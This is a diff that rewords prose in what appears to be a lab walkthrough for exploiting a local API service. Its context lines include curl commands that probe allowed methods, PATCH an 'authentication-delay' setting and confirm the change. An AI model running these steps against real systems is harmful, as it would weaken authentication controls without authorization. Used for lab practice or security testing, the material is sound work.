@@ -158,9 +158,12 @@ curl -s http://127.0.0.1:2048/api/sle-config/ | jq .
 
 ## 4. Exploitation Capability Validation
 
-You will **prove** modification is possible - then **execute it**
+In this section, you will **prove** modification is possible - then **execute it**
 
 ### 4.1 Check allowed methods
+
+Let's start by checking which methods are allowed:
+
 ```bash
 curl -i -X OPTIONS http://127.0.0.1:2048/api/service-instances/test
 ```
@@ -185,7 +188,7 @@ curl -i -X PATCH http://127.0.0.1:2048/api/sle-config/authentication-delay \
 <img width="1096" height="152" alt="2026-03-19_12-15" src="https://github.com/user-attachments/assets/39269311-43a4-4c06-916f-e80c691c894e" />
 
 
-Verify the change took effect:
+We need to verify the change took effect. Run the following:
 
 ```bash
 curl -s http://127.0.0.1:2048/api/sle-config/authentication-delay | jq .
